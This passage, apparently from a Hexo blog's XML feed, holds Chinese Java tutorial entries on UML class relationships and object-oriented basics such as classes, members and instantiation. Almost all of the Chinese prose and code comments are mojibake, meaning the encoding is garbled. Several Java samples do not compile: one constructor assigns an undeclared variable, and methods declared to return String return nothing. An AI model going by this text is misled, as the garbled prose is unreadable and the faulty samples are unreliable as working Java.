ï¼Œä¸€æ–¹å¯ä»¥è°ƒç”¨å¦ä¸€æ–¹çš„å…¬å…±å±æ€§å’Œæ–¹æ³•ã€‚æ²¡æœ‰ç”Ÿå‘½æœŸçš„ä¾èµ–ã€‚</li><li>è‡ªèº«å…³è”ï¼šè‡ªå·±å¼•ç”¨è‡ªå·±ï¼Œå¸¦ç€ä¸€ä¸ªè‡ªå·±çš„å¼•ç”¨ã€‚</li></ul><p>åœ¨æœ€ç»ˆä»£ç ä¸­ï¼Œå…³è”å¯¹è±¡é€šå¸¸æ˜¯ä»¥æˆå‘˜å˜é‡çš„å½¢å¼å®ç°çš„ï¼›</p><h3 id="ä¾èµ–å…³ç³»-dependency"><a href="#ä¾èµ–å…³ç³»-dependency" class="headerlink" title="ä¾èµ–å…³ç³»(dependency)"></a>ä¾èµ–å…³ç³»(dependency)</h3><p>æ˜¯ä¸€ç§ä½¿ç”¨çš„å…³ç³»ï¼Œå³ä¸€ä¸ªç±»çš„å®ç°éœ€è¦å¦ä¸€ä¸ªç±»çš„ååŠ©ï¼Œæ‰€ä»¥è¦å°½é‡ä¸ä½¿ç”¨åŒå‘çš„äº’ç›¸ä¾èµ–ã€‚</p><h3 id="ç±»é—´å…³ç³»è¡¨ç¤º"><a href="#ç±»é—´å…³ç³»è¡¨ç¤º" class="headerlink" title="ç±»é—´å…³ç³»è¡¨ç¤º"></a>ç±»é—´å…³ç³»è¡¨ç¤º</h3><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/3e212b19270be8e84d10939b4c8e1e23.png" alt="2020041110061614"></p><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/964fd4f768667e7c84bf4949f61b79b3.jpg" alt="1"></p><h2 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h2><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/0ed40334c6b17af32c77f1df9818c85f.jpg" alt="3"></p><ul><li>è½¦çš„ç±»å›¾ç»“æ„ä¸º&lt;<abstract>&gt;ï¼Œè¡¨ç¤ºè½¦æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼›</abstract></li><li>å®ƒæœ‰ä¸¤ä¸ªç»§æ‰¿ç±»ï¼šå°æ±½è½¦å’Œè‡ªè¡Œè½¦ï¼›å®ƒä»¬ä¹‹é—´çš„å…³ç³»ä¸ºå®ç°å…³ç³»ï¼Œä½¿ç”¨å¸¦ç©ºå¿ƒç®­å¤´çš„è™šçº¿è¡¨ç¤ºï¼›</li><li>å°æ±½è½¦ä¸ºä¸SUVä¹‹é—´ä¹Ÿæ˜¯ç»§æ‰¿å…³ç³»ï¼Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»ä¸ºæ³›åŒ–å…³ç³»ï¼Œä½¿ç”¨å¸¦ç©ºå¿ƒç®­å¤´çš„å®çº¿è¡¨ç¤ºï¼›</li><li>å°æ±½è½¦ä¸å‘åŠ¨æœºä¹‹é—´æ˜¯ç»„åˆå…³ç³»ï¼Œä½¿ç”¨å¸¦å®å¿ƒç®­å¤´çš„å®çº¿è¡¨ç¤ºï¼›</li><li>å­¦ç”Ÿä¸ç­çº§ä¹‹é—´æ˜¯èšåˆå…³ç³»ï¼Œä½¿ç”¨å¸¦ç©ºå¿ƒç®­å¤´çš„å®çº¿è¡¨ç¤ºï¼›</li><li>å­¦ç”Ÿä¸èº«ä»½è¯ä¹‹é—´ä¸ºå…³è”å…³ç³»ï¼Œä½¿ç”¨ä¸€æ ¹å®çº¿è¡¨ç¤ºï¼›</li><li>å­¦ç”Ÿä¸Šå­¦éœ€è¦ç”¨åˆ°è‡ªè¡Œè½¦ï¼Œä¸è‡ªè¡Œè½¦æ˜¯ä¸€ç§ä¾èµ–å…³ç³»ï¼Œä½¿ç”¨å¸¦ç®­å¤´çš„è™šçº¿è¡¨ç¤ºï¼›</li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>ç±»å›¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é¢å‘å¯¹è±¡</title>
    <link href="/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <url>/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h1><h2 id="ä¸€ã€Javaé¢å‘å¯¹è±¡å­¦ä¹ çš„ä¸‰æ¡ä¸»çº¿"><a href="#ä¸€ã€Javaé¢å‘å¯¹è±¡å­¦ä¹ çš„ä¸‰æ¡ä¸»çº¿" class="headerlink" title="ä¸€ã€Javaé¢å‘å¯¹è±¡å­¦ä¹ çš„ä¸‰æ¡ä¸»çº¿"></a>ä¸€ã€Javaé¢å‘å¯¹è±¡å­¦ä¹ çš„ä¸‰æ¡ä¸»çº¿</h2><p>1ã€Javaç±»åŠç±»çš„æˆå‘˜ï¼šå±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ï¼›ä»£ç å—ã€å†…éƒ¨å—</p><p>2ã€é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾ï¼šå°è£…æ€§ã€ç»§æ‰¿æ€§ã€å¤šæ€æ€§ã€ï¼ˆæŠ½è±¡æ€§ï¼‰</p><p>3ã€å…¶ä»–å…³é”®å­—ï¼šthisã€superã€staticã€finalã€abstractã€interfaceã€packageã€import</p><h2 id="äºŒã€é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡"><a href="#äºŒã€é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡" class="headerlink" title="äºŒã€é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡"></a>äºŒã€é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡</h2><h3 id="é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡"><a href="#é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡"></a>é¢å‘è¿‡ç¨‹ä¸é¢å‘å¯¹è±¡</h3><p>é¢å‘å¯¹è±¡ï¼šObject Oriented Programming ï¼›é¢å‘è¿‡ç¨‹ï¼šProcedure Oriented Programming</p><p>äºŒè€…éƒ½æ˜¯ä¸€ç§æ€æƒ³ï¼Œé¢å‘å¯¹è±¡æ˜¯ç›¸å¯¹äºé¢å‘è¿‡ç¨‹è€Œè¨€çš„ã€‚é¢å‘è¿‡ç¨‹ï¼Œå¼ºè°ƒçš„æ˜¯åŠŸèƒ½è¡Œä¸ºï¼Œä»¥å‡½æ•°ä¸ºæœ€å°å•ä½ï¼Œè€ƒè™‘æ€ä¹ˆåšã€‚ é¢å‘å¯¹è±¡ï¼Œå°†åŠŸèƒ½å°è£…è¿›å¯¹è±¡ï¼Œå¼ºè°ƒå…·å¤‡äº†åŠŸèƒ½çš„å¯¹è±¡ï¼Œä»¥ç±»/å¯¹è±¡ä¸ºæœ€å°å•ä½ï¼Œè€ƒè™‘è°æ¥åšã€‚</p><p>é¢å‘å¯¹è±¡æ›´åŠ å¼ºè°ƒè¿ç”¨äººç±»åœ¨æ—¥å¸¸çš„æ€ç»´é€»è¾‘ä¸­é‡‡ç”¨çš„æ€æƒ³æ–¹æ³•ä¸åŸåˆ™ï¼Œå¦‚æŠ½è±¡ã€åˆ†ç±»ã€ç»§æ‰¿ã€èšåˆã€å¤šæ€ç­‰ã€‚</p><p><strong>â€œäººæŠŠå¤§è±¡è£…è¿›å†°ç®±â€</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1</span>ã€é¢å‘è¿‡ç¨‹ï¼šå¼ºè°ƒçš„æ˜¯åŠŸèƒ½è¡Œä¸ºï¼Œä»¥å‡½æ•°ä¸ºæœ€å°å•ä½ï¼Œè€ƒè™‘æ€ä¹ˆåšã€‚<br><span class="hljs-number">1</span>ï¼‰æŠŠå†°ç®±é—¨æ‰“å¼€<br><span class="hljs-number">2</span>ï¼‰æŠ¬èµ·å¤§è±¡ï¼Œå¡è¿›å†°ç®±<br><span class="hljs-number">3</span>ï¼‰æŠŠå†°ç®±é—¨å…³é—­<br><span class="hljs-number">2</span>ã€é¢å‘å¯¹è±¡ï¼šå¼ºè°ƒå…·å¤‡äº†åŠŸèƒ½çš„å¯¹è±¡ï¼Œä»¥ç±»/å¯¹è±¡ä¸ºæœ€å°å•ä½ï¼Œè€ƒè™‘è°æ¥åšã€‚<br><br>äºº&#123;<br>æ‰“å¼€<span class="hljs-comment">(å†°ç®±)</span>&#123;<br>å†°ç®±.å¼€å¼€<span class="hljs-comment">()</span>;<br>&#125;<br>æŠ¬èµ·<span class="hljs-comment">(å¤§è±¡)</span>&#123;<br>å¤§è±¡.è¿›å…¥<span class="hljs-comment">(å†°ç®±)</span>;<br>&#125;<br>å…³é—­<span class="hljs-comment">(å†°ç®±)</span>&#123;<br>å†°ç®±.é—­åˆ<span class="hljs-comment">()</span>;<br>&#125;<br>&#125;<br>å†°ç®±&#123;<br>å¼€å¼€<span class="hljs-comment">()</span>&#123;&#125;<br>é—­åˆ<span class="hljs-comment">()</span>&#123;&#125;<br>&#125;<br>å¤§è±¡&#123;<br>è¿›å…¥<span class="hljs-comment">(å†°ç®±)</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é¢å‘å¯¹è±¡çš„ä¸‰ä¸ªç‰¹å¾ï¼š"><a href="#é¢å‘å¯¹è±¡çš„ä¸‰ä¸ªç‰¹å¾ï¼š" class="headerlink" title="é¢å‘å¯¹è±¡çš„ä¸‰ä¸ªç‰¹å¾ï¼š"></a>é¢å‘å¯¹è±¡çš„ä¸‰ä¸ªç‰¹å¾ï¼š</h3><ul><li><p>å°è£…(EncapsuIation)</p></li><li><p>ç»§æ‰¿(lnheritance)</p></li><li><p>å¤šæ€(Polymorphism)</p></li></ul><h3 id="é¢å‘å¯¹è±¡çš„æ€æƒ³æ¦‚è¿°"><a href="#é¢å‘å¯¹è±¡çš„æ€æƒ³æ¦‚è¿°" class="headerlink" title="é¢å‘å¯¹è±¡çš„æ€æƒ³æ¦‚è¿°"></a>é¢å‘å¯¹è±¡çš„æ€æƒ³æ¦‚è¿°</h3><p>ç¨‹åºå‘˜ä»é¢å‘è¿‡ç¨‹çš„æ‰§è¡Œè€…è½¬åŒ–æˆäº†é¢å‘å¯¹è±¡çš„æŒ‡æŒ¥è€…ã€‚</p><p><strong>é¢å‘å¯¹è±¡åˆ†ææ–¹æ³•åˆ†æé—®é¢˜çš„æ€è·¯å’Œæ­¥éª¤ï¼š</strong></p><ul><li>æ ¹æ®é—®é¢˜éœ€è¦ï¼Œé€‰æ‹©é—®é¢˜æ‰€é’ˆå¯¹çš„ç°å®ä¸–ç•Œä¸­çš„å®ä½“ã€‚</li><li>ä»å®ä½“ä¸­å¯»æ‰¾è§£å†³é—®é¢˜ç›¸å…³çš„å±æ€§å’ŒåŠŸèƒ½ï¼Œè¿™äº›å±æ€§å’ŒåŠŸèƒ½å°±å½¢æˆäº†æ¦‚å¿µä¸–ç•Œä¸­çš„ç±»ã€‚</li><li>æŠŠæŠ½è±¡çš„å®ä½“ç”¨è®¡ç®—æœºè¯­è¨€è¿›è¡Œæè¿°ï¼Œå½¢æˆè®¡ç®—æœºä¸–ç•Œä¸­ç±»çš„å®šä¹‰ã€‚å³å€ŸåŠ©æŸç§ç¨‹åºè¯­è¨€ï¼ŒæŠŠç±»æ„é€ æˆè®¡ç®—æœºèƒ½å¤Ÿè¯†åˆ«å’Œå¤„ç†çš„æ•°æ®ç»“æ„ã€‚</li><li>å°†ç±»å®ä¾‹åŒ–æˆè®¡ç®—æœºä¸–ç•Œä¸­çš„å¯¹è±¡ã€‚å¯¹è±¡æ˜¯è®¡ç®—æœºä¸–ç•Œä¸­è§£å†³é—®é¢˜çš„æœ€ç»ˆå·¥å…·ã€‚</li></ul><h2 id="ä¸‰ã€Javaè¯­è¨€åŸºæœ¬å…ƒç´ ï¼šç±»ä¸å¯¹è±¡"><a href="#ä¸‰ã€Javaè¯­è¨€åŸºæœ¬å…ƒç´ ï¼šç±»ä¸å¯¹è±¡" class="headerlink" title="ä¸‰ã€Javaè¯­è¨€åŸºæœ¬å…ƒç´ ï¼šç±»ä¸å¯¹è±¡"></a>ä¸‰ã€Javaè¯­è¨€åŸºæœ¬å…ƒç´ ï¼šç±»ä¸å¯¹è±¡</h2><p>ç±»ï¼ˆClassï¼‰å’Œå¯¹è±¡ï¼ˆObjectï¼‰æ˜¯é¢å‘å¯¹è±¡çš„æ ¸å¿ƒæ¦‚å¿µã€‚</p><ul><li>ç±»æ˜¯å¯¹ä¸€ç±»äº‹ç‰©çš„æè¿°ï¼Œæ˜¯æŠ½è±¡çš„ã€æ¦‚å¿µä¸Šçš„å®šä¹‰</li><li>å¯¹è±¡æ˜¯å®é™…å­˜åœ¨çš„è¯¥ç±»äº‹ç‰©çš„æ¯ä¸ªä¸ªä½“ï¼Œå› è€Œä¹Ÿç§°ä¸ºå®ä¾‹ï¼ˆinstanceï¼‰</li><li>â€œä¸‡äº‹ä¸‡ç‰©çš†å¯¹è±¡â€</li></ul><p><strong>å¯ä»¥ç†è§£ä¸ºï¼šç±» = æŠ½è±¡æ¦‚å¿µçš„äººï¼›å¯¹è±¡ = å®å®åœ¨åœ¨çš„æŸä¸ªäºº</strong></p><p><strong>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡çš„é‡ç‚¹æ˜¯ç±»çš„è®¾è®¡ï¼›ç±»çš„è®¾è®¡ï¼Œå…¶å®å°±æ˜¯ç±»çš„æˆå‘˜çš„è®¾è®¡</strong></p><h3 id="Java-ç±»åŠç±»çš„æˆå‘˜"><a href="#Java-ç±»åŠç±»çš„æˆå‘˜" class="headerlink" title="Java ç±»åŠç±»çš„æˆå‘˜"></a>Java ç±»åŠç±»çš„æˆå‘˜</h3><p>ç°å®ä¸–ç•Œçš„ç”Ÿç‰©ä½“ï¼Œå¤§åˆ°é²¸é±¼ï¼Œå°åˆ°èš‚èšï¼Œéƒ½æ˜¯ç”±æœ€åŸºæœ¬çš„ç»†èƒæ„æˆçš„ã€‚åŒç†ï¼ŒJava ä»£ç ä¸–ç•Œæ˜¯ç”±è¯¸å¤šä¸ªä¸åŒåŠŸèƒ½çš„ç±»æ„æˆçš„ã€‚ç°å®ç”Ÿç‰©ä¸–ç•Œä¸­çš„ç»†èƒåˆæ˜¯ç”±ä»€ä¹ˆæ„æˆçš„å‘¢ï¼Ÿç»†èƒæ ¸ã€ç»†èƒè´¨ã€Â·Â·Â·Â·Â·Â·ï¼Œé‚£ä¹ˆï¼ŒJavaä¸­ç”¨ç±»Classæ¥æè¿°äº‹ç‰©ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¸¸è§çš„ç±»çš„æˆå‘˜æœ‰ï¼š</p><ul><li>å±æ€§ï¼šå¯¹åº”ç±»ä¸­çš„æˆå‘˜å˜é‡          Field = å±æ€§ = æˆå‘˜å˜é‡ = åŸŸã€å­—æ®µï¼›</li><li>è¡Œä¸ºï¼šå¯¹åº”ç±»ä¸­çš„æˆå‘˜æ–¹æ³•          Method = ï¼ˆæˆå‘˜ï¼‰æ–¹æ³• = å‡½æ•°</li></ul><p>ç±»çš„æˆå‘˜æ„æˆ1.0ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç±»çš„æˆå‘˜æ„æˆ1.0ï¼š</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-comment">//å±æ€§</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">boolean</span> isMarried;<br>    <span class="hljs-comment">//æ–¹æ³•</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">walk</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;äººèµ°è·¯&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">display</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;åå­—æ˜¯: &quot;</span> +name+<span class="hljs-string">&quot;, å¹´é¾„æ˜¯: &quot;</span> +age+<span class="hljs-string">&quot;, Married: &quot;</span>+isMarried;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»çš„æˆå‘˜æ„æˆ2.0ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç±»çš„æˆå‘˜æ„æˆ2.0ï¼š</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br><span class="hljs-comment">//å±æ€§æˆ–æˆå‘˜å˜é‡</span><br>String name;<br><span class="hljs-keyword">boolean</span> isMarried;<br><span class="hljs-comment">//æ„é€ å™¨</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name, <span class="hljs-keyword">boolean</span> im)</span></span>&#123;<br>        name = n;isMarried = im;<br>    &#125;<br><span class="hljs-comment">//æ–¹æ³•æˆ–å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">walk</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;äººèµ°è·¯&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">display</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;åå­—æ˜¯: &quot;</span> +name+<span class="hljs-string">&quot;, Married: &quot;</span>+isMarried;<br>    &#125;<br><span class="hljs-comment">//ä»£ç å—</span><br>&#123;<br>    name = <span class="hljs-string">&quot;HanMeiMei&quot;</span>;<br>    age = <span class="hljs-number">17</span>;<br>    isMarried = <span class="hljs-keyword">true</span>;<br>&#125;<br><span class="hljs-comment">//å†…éƒ¨ç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pet</span></span>&#123;<br>    String name;<br>    <span class="hljs-keyword">float</span> weight;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Javaç±»çš„ä½¿ç”¨ï¼š"><a href="#Javaç±»çš„ä½¿ç”¨ï¼š" class="headerlink" title="Javaç±»çš„ä½¿ç”¨ï¼š"></a>Javaç±»çš„ä½¿ç”¨ï¼š</h3><p><strong>Javaç±»çš„å®ä¾‹åŒ–ï¼Œå³åˆ›å»ºç±»çš„å¯¹è±¡</strong> ï¼ˆåˆ›å»ºç±»çš„å¯¹è±¡ = ç±»çš„å®ä¾‹åŒ– = å®ä¾‹åŒ–ç±»ï¼‰</p><p>ç±»å’Œå¯¹è±¡çš„ä½¿ç”¨ï¼ˆé¢å‘å¯¹è±¡æ€æƒ³è½åœ°çš„å®ç°ï¼‰ï¼š</p><ul><li>åˆ›å»ºç±»ï¼Œè®¾è®¡ç±»çš„æˆå‘˜</li><li>åˆ›å»ºç±»çš„å¯¹è±¡</li><li>é€šè¿‡â€œ<strong>å¯¹è±¡.å±æ€§</strong>â€æˆ–â€œ<strong>å¯¹è±¡.æ–¹æ³•</strong>â€è°ƒç”¨å¯¹è±¡çš„ç»“æ„</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æµ‹è¯•ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        <span class="hljs-comment">//åˆ›å»ºPersonç±»çš„å¯¹è±¡</span><br>        Person p1 = <span class="hljs-keyword">new</span> Person();<br>        <span class="hljs-comment">//Scanner scanner = new Scanner(System.in);</span><br>        <br>        <span class="hljs-comment">//è°ƒç”¨å¯¹è±¡çš„ç»“æ„ï¼šå±æ€§ã€æ–¹æ³•</span><br>        <span class="hljs-comment">//è°ƒç”¨å±æ€§ï¼šâ€œå¯¹è±¡.å±æ€§â€</span><br>        p1.name = <span class="hljs-string">&quot;Tom&quot;</span>;<br>        p1.isMale = <span class="hljs-keyword">true</span>;<br>        System.out.println(p1.name);<br>        <span class="hljs-comment">//è°ƒç”¨æ–¹æ³•ï¼šâ€œå¯¹è±¡.æ–¹æ³•â€</span><br>        p1.eat();<br>        p1.sleep();<br>        p1.talk(<span class="hljs-string">&quot;Chinese&quot;</span>);<br>        <span class="hljs-comment">//***********************</span><br>        Person p2 = <span class="hljs-keyword">new</span> Person();<br>        System.out.println(p2.name); <span class="hljs-comment">//Tom? null? æŠ¥é”™?</span><br>        <span class="hljs-comment">//å¦‚æœåˆ›å»ºäº†ä¸€ä¸ªç±»çš„å¤šä¸ªå¯¹è±¡ï¼Œåˆ™æ¯ä¸ªå¯¹è±¡éƒ½ç‹¬ç«‹çš„æ‹¥æœ‰ä¸€å¥—ç±»çš„å±æ€§ã€‚ï¼ˆéstaticçš„ï¼‰</span><br>        <span class="hljs-comment">//æ„å‘³ç€å¦‚æœæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„å±æ€§aï¼Œåˆ™ä¸å½±å“å¦ä¸€ä¸ªå¯¹è±¡çš„å±æ€§açš„å€¼ã€‚</span><br>        <span class="hljs-comment">//***********************</span><br>        <span class="hljs-comment">//å°†p1å˜é‡ä¿å­˜çš„å¯¹è±¡åœ°å€å€¼èµ‹ç»™p3ï¼Œå¯¼è‡´p1å’Œp3æŒ‡å‘äº†å †ç©ºé—´ä¸­çš„åŒä¸€å¯¹è±¡å®ä½“ã€‚</span><br>        Person p3 = p1;<br>        System.out.println(p3.name); <span class="hljs-comment">//Tom</span><br>        <br>        p3.age = <span class="hljs-number">10</span>;<br>        System.out.println(p1.age); <span class="hljs-comment">//10</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-comment">//å±æ€§</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">boolean</span> isMale;<br>    <span class="hljs-comment">//æ–¹æ³•</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;äººå¯ä»¥åƒé¥­&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">sleep</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;äººå¯ä»¥ç¡è§‰&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">talk</span><span class="hljs-params">(String language)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;äººå¯ä»¥è¯´è¯ï¼Œä½¿ç”¨çš„æ˜¯ï¼š&quot;</span> + language);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¯¹è±¡çš„å†…å­˜è§£æï¼š"><a href="#å¯¹è±¡çš„å†…å­˜è§£æï¼š" class="headerlink" title="å¯¹è±¡çš„å†…å­˜è§£æï¼š"></a>å¯¹è±¡çš„å†…å­˜è§£æï¼š</h3><p><img src="/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/e4a1d04de3e924f114c5a5fa9dadb83c.png" alt="image-20211002222541178"></p><p><img src="/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/7c2475169f0ee232e823609ac1f2b61f.png" alt="image-20211002223855789"></p><h3 id="ç±»ä¸­å±æ€§çš„ä½¿ç”¨"><a href="#ç±»ä¸­å±æ€§çš„ä½¿ç”¨" class="headerlink" title="ç±»ä¸­å±æ€§çš„ä½¿ç”¨"></a>ç±»ä¸­å±æ€§çš„ä½¿ç”¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å±æ€§ï¼ˆæˆå‘˜å˜é‡ï¼‰ vs å±€éƒ¨å˜é‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1ã€ç›¸åŒç‚¹ï¼š</span><br><span class="hljs-comment"> *     1.1 å®šä¹‰å˜é‡çš„æ ¼å¼ï¼šæ•°æ®ç±»å‹ å˜é‡å = å˜é‡å€¼</span><br><span class="hljs-comment"> *     1.2 å…ˆå£°æ˜ï¼Œåä½¿ç”¨</span><br><span class="hljs-comment"> *     1.3 å˜é‡éƒ½æœ‰å…¶å¯¹åº”çš„ä½œç”¨åŸŸ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 